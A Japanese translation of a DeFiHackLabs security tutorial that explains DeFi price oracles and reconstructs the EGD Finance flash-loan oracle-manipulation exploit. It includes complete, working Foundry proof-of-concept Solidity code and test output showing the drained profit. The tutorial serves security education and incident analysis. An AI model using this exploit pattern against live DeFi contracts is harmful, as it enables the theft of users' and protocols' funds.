# オンチェーン取引のデバッグ: 3. 独自の PoC（価格オラクル操作）を作成する

著者: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

翻訳: [「」](https://x.com/yuu11111_?s=21)

コミュニティ: [Discord](https://discord.gg/Fjyngakf3h)

公開元: XREX | [WTF Academy](https://github.com/AmazingAng/WTF-Solidity#%E9%93%BE%E4%B8%8A%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90)

[01_Tools](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en)では、スマートコントラクトのトランザクションを分析するための様々なツールの使い方を学びました。

[02_Warm](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/en/readme.md)では、Foundry を使って分散型取引所でのトランザクションを分析しました。

この記事では、oracle exploit を利用したハッカー事件を分析します。主要な関数呼び出しを段階的に見ていき、その後、Foundry フレームワークを使って一緒に攻撃を再現していきます。

## なぜ攻撃の再現が役立つのか？

DeFiHackLabs では、Web3 セキュリティの普及を目指しています。攻撃が発生した際に、より多くの人々が分析に参加し、全体のセキュリティに貢献できることを願っています。

1. 被害者としての対応力向上: 不幸な被害者として、私たちはインシデント対応の迅速性と効果性を向上させることができます。
2. ホワイトハットとしてのスキルアップ: ホワイトハットとして、PoC（概念実証）の作成能力を向上させ、バグバウンティを獲得する機会を増やせます。
3. ブルーチームへの貢献: 例えば[Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/)のように、機械学習モデルの調整を支援できます。
4. 理解度の深化: 事後報告を読むよりも、攻撃を再現する方がはるかに多くのことを学べます。
5. Solidity の総合的な向上: 全体的な Solidity の「カンフー」を向上させることができます。

### トランザクションを再現する前に知っておくべきこと

1.  一般的な攻撃の理解。これについては、[DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs)でまとめています。
2.  スマートコントラクトが互いにどのようにやり取りするかを含む、基本的な DeFi メカニズムの理解。

### DeFi オラクルの紹介

現在、価格や設定などのスマートコントラクトの値は自動的に更新できません。コントラクトロジックを実行するためには、実行中に外部データが必要になる場合があります。これは通常、以下の方法で行われます。

1. 外部所有アカウント（EOA）経由: これらのアカウントの準備金に基づいて価格を計算できます。
2. オラクルを使用: オラクルは誰かによって、またはあなた自身によって管理され、価格、金利など、外部データが定期的に更新されます。

- 例えば、Uniswap V2 では、資産の現在の価格が提供され、これにより取引される資産の相対的な価値が決定され、取引が実行されます。

    - 図に従うと、ETH 価格は外部データです。スマートコントラクトはそれを Uniswap V2 から取得します。
    
        典型的な AMM では`x * y = k`という式があることを知っています。`x`（この場合 ETH 価格）= `k / y`です。
        
        そこで、Uniswap V2 WETH/USDC 取引ペアコントラクトを見てみましょう。アドレスは`0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`です。

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

- 公開時点での準備金は以下の通りです:

  - WETH: `33,906.6145928` USDC: `42,346,768.252804`

  - 式: `x * y = k`の式を適用すると、各 ETH の価格は以下のようになります:

    `42,346,768.252804 / 33,906.6145928 = 1248.9235`

    (市場価格は、計算された価格と数セント異なる場合があります。ほとんどの場合、これは取引手数料やプールに影響を与える新しい取引を指します。この差異は`skim()`[^1]で調整できます。)

    - Solidity 疑似コード: 貸付コントラクトが現在の ETH 価格を取得するための疑似コードは以下のようになります:

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```

> #### この価格取得方法は簡単に操作されるため、本番コードでは使用しないでください。

[^1]:
    Skim() :
    Uniswap V2 は、流動性プールを使って資産を取引する分散型取引所（DEX）です。ペアコントラクトの残高を変更する可能性のあるカスタマイズされたトークン実装から生じる潜在的な問題を防ぐための安全策として、skim()関数を備えています。しかし、skim()は価格操作と組み合わせて使用することも可能です。
    skim()の詳しい説明は図を参照してください。
    ![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
    Image source / [Uniswap V2 Core whitepaper](https://uniswap.org/whitepaper.pdf)

- 詳細については、以下のリソースを参照してください:
  - Uniswap V2 AMM メカニズム: [Smart Contract Programmer](https://www.youtube.com/watch?v=Ar4Ik7Bov0U)。
  - オラクル操作: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md)。

### オラクル価格操作の攻撃

最も一般的な攻撃:

1. オラクルアドレスの変更
   - 根本原因: 検証メカニズムの欠如
   - 例: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. フラッシュローンによる流動性の枯渇

   - フラッシュローンを介して、攻撃者は流動性を枯渇させ、オラクルで誤った価格情報が発生させます。これは、攻撃者がこれらの関数を呼び出す際によく見られます: `GetPrice`、`Swap`、`StackingReward`、`Transfer(with burn fee)`など。
   - 根本原因: 安全でない/侵害されたオラクルを使用しているプロトコル、またはオラクルが時間加重平均価格機能を実装していない。
   - 例: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

   > ヒント - ケース 2: コードレビュー中に、関数`balanceOf()`が適切に保護されていることを確認してください。

---

## ステップバイステップの PoC - EGD Finance の例

### ステップ 1: 情報収集

- 攻撃が発覚すると、Twitter はしばしば事後状況の最前線になります。トップの DeFi アナリストがそこで新しい調査結果を継続的に公開します。

> ヒント: [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h)の security-alert チャンネルに参加して、トップの DeFi アナリストからの厳選された最新情報を受け取りましょう！

- 攻撃事件が発生した場合、最新の情報を収集し整理することが重要です。ここにテンプレートがあります！
    1. トランザクション ID
    2. 攻撃者のアドレス（EOA）
    3. 攻撃コントラクトアドレス
    4. 脆弱なアドレス
    5. 総損失額
    6. 参照リンク
    7. 事後分析（ポストモーテム）リンク
    8. 脆弱なスニペット
    9. 監査履歴

> ヒント: DeFiHackLabs の[Exploit-Template.sol](https://www.google.com/search?q=/script/Exploit-template.sol)テンプレートを使用しましょう。

---

### ステップ 2: トランザクションのデバッグ

経験上、攻撃から 12 時間後には、攻撃の検視の 90%が完了しています。この時点での攻撃分析は通常それほど難しくありません。

- オラクル操作のリスク、オラクル操作から利益を得る方法、フラッシュローンのトランザクション、そして攻撃者が 1 回のトランザクションだけで攻撃を達成する方法を理解するのに役立つよう、[EGD Finance Exploit attack](https://twitter.com/BlockSecTeam/status/1556483435388350464)の実際のケースを例として使用します。

- Blocksec の[Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)を使って EGD Finance の事件を分析しましょう。
  <img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

- イーサリアム EVM では、リモート関数をトリガーするために 3 つの呼び出しタイプがあります:
    1. Call: 典型的なコントラクト間の関数呼び出しで、しばしば受信者のストレージを変更します。
    2. StaticCall: 受信者のストレージを変更せず、状態や変数を取得するために使用されます。
    3. DelegateCall: `msg.sender`は同じままで、通常プロキシ呼び出しで使用されます。詳細については[WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall)を参照してください。

> 内部関数呼び出し[^2]はイーサリアム EVM では見えないことに注意してください。

[^2]: 内部関数呼び出しは、新しいトランザクションやブロックを生成しないため、ブロックチェーン上では見えません。このため、他のスマートコントラクトから読み取られたり、ブロックチェーンの取引履歴に表示されたりすることはありません。

- 詳細情報 - 攻撃者のフラッシュローン攻撃モード
    1. 攻撃が利益を生むか確認する: まず、ローンが取得できることを確認し、次にターゲットが十分な残高を持っていることを確認します。
       - これは、最初にいくつかの「Static calls」が表示されることを意味します。
    2. DEX またはレンディングプロトコルを使用してフラッシュローンを取得する: 以下の主要な関数呼び出しを探します。
       - UniswapV2, Pancakeswap: `.swap()`
       - Balancer: `flashLoan()`
       - DODO: `.flashloan()`
       - AAVE: `.flashLoan()`
    3. フラッシュローンプロトコルから攻撃者のコントラクトへのコールバック: 以下の主要な関数呼び出しを探します。
          - UniswapV2: `.uniswapV2Call()`
          - Pancakeswap: `.Pancakeswap()`
          - Balancer: `.receiveFlashLoan()`
          - DODO: `.DXXFlashLoanCall()`
          - AAVE: `.executeOperation()`
     4. 攻撃を実行してコントラクトの弱点から利益を得る
     5. フラッシュローンを返済する

### 演習:

EGD Finance Exploit 攻撃のさまざまな段階を[Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)で特定してください。特に、「flashloan」、「callback」、「weakness」、「profit」に注目してください。

`Expand Level: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

> ヒント: 個々の関数呼び出しのロジックを理解できない場合は、コールスタック全体を順にトレースし、メモを取り、送金の流れに特に注意を払ってみてください。これを数回繰り返すと、はるかによく理解できるようになります。

<details><summary>解答</summary>

<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>

### ステップ 3: コードを再現する

攻撃トランザクションの関数呼び出しを分析した後、次にいくつかのコードを再現してみましょう。

#### ステップ A. フィクスチャを完成させる。

<details><summary>コードを表示する</summary>

```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```

</details>
<br>

#### ステップ B. 攻撃者が`harvest`関数を呼び出すのをシミュレートする

<details><summary>コードを表示する</summary>

```solidity=
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }

    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);

        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```

</details>
<br>

#### ステップ C. 攻撃コントラクトの一部を完成させる

<details><summary>コードを表示する</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }


	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>

### ステップ 4: エクスプロイトの分析

ここでは、攻撃者が`Pancakeswap.swap()`関数を呼び出してエクスプロイトを利用したことがわかります。コールスタックには 2 回目のフラッシュローン呼び出しがあるようです。
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

- Pancakeswap は`.pancakeCall()`インターフェースを使って攻撃者のコントラクトにコールバックを実行します。2 回のコールバックで攻撃者が異なるコードを実行しているのはなぜか疑問に思うかもしれません。

鍵は最初のフラッシュローンにあります。攻撃者はコールバックデータに`0x0000`を使用しました。
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

しかし、2 回目のフラッシュローンでは、攻撃者はコールバックデータに`0x00`を使用しました。
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

この方法によって、攻撃コントラクトは`_data`パラメータに基づいて、`0x0000`または`0x00`のどちらかのコードを実行するかを決定できます。

- 2 回目のフラッシュローン中の 2 回目のコールバックロジックの分析を続けましょう。

2 回目のコールバック中、攻撃者は EGD Finance から`claimAllReward()`のみを呼び出しました。

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

`claimAllReward()`のコールスタックをさらに展開すると、EGD Finance が EGD トークンと USDT の残高を`0xa361-Cake-LP`から読み取り、大量の EGD トークンを攻撃者のコントラクトに転送したことがわかります。

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>'0xa361-Cake-LP'コントラクトとは何か？</summary>

Etherscan を使って、`0xa361-Cake-LP`がどの取引ペアに対応しているかを確認できます。

- オプション 1（より速い）: [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d)でコントラクトの 2 つの最大の準備金トークンを確認します。

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

- オプション 2（正確）: [Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract)で token0 と token1 のアドレスを確認します。

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

これは、`0xa361-Cake-LP`が EGD/USDT 取引ペアコントラクトであることを示しています。

</details>
<br>

- `claimAllReward()`関数を分析して、エクスプロイトがどこにあるかを見てみましょう。
  <img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

Staking Reward の量は、`rewardQuota`（ステーキング量とステーキング期間を意味する）に現在の EGD トークン価格である`getEGDPrice()`を掛けたものに基づいていることがわかります。

**これはつまり、EGD ステーキング報酬が EGD トークンの価格に基づいて決定されることを意味します。EGD トークン価格が高いと報酬が少なく、逆もまた然りです。**

- 次に、`getEGDPrice()`関数が現在の EGD トークン価格をどのように取得しているかを確認しましょう。

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

以前 DeFi オラクルの紹介セクションで説明したのと同様に、おなじみの`x * y = k`の式を使って現在の価格を取得していることがわかります。取引ペアのアドレスは`0xa361-Cake-LP`であり、これはトランザクションビューの 2 つの STATICCALL と一致します。

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

では、攻撃者はこの安全でない現在価格取得方法をどのように悪用しているのでしょうか？

根本的なメカニズムは、2 回目のフラッシュローンから攻撃者が大量の USDT を借り入れたため、`x * y = k`の式に基づいてプール価格に影響を与えたということです。ローンを返済する前に、`getEGDPrice()`は不正な値になります。

参照図:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**結論: 攻撃者はフラッシュローンを利用して EGD/USDT 取引ペアの流動性を操作し、その結果、`ClaimReward()`が誤った価格を取得し、攻撃者が大量の EGD トークンを獲得できるようになりました。**

最後に、攻撃者は Pancakeswap を使って EGD トークンを USDT に交換し、攻撃から利益を得ました。

---

### ステップ 5: 再現

攻撃を完全に理解したところで、次にそれを再現してみましょう。

ステップ D. 攻撃の PoC コードを作成する

<details><summary>コードを表示する</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }


	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>

ステップ E. エクスプロイトを使用して 2 回目のフラッシュローンの PoC コードを作成する

<details><summary>コードを表示する</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }


	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

ステップ F. `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`でコードを実行し、残高の変化に注意してください。

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```

注: DeFiHackLabs の EGD-Finance.exp.sol には、ステーキングという先行ステップが含まれています。

この解説にはこのステップは含まれていませんので、ご自身で試してみてください！攻撃者のステーキング Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

#### 第 3 回の共有はここで終了です。さらに学びたい場合は、以下のリンクを確認してください。

---

### 学習資料

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---

### 付録
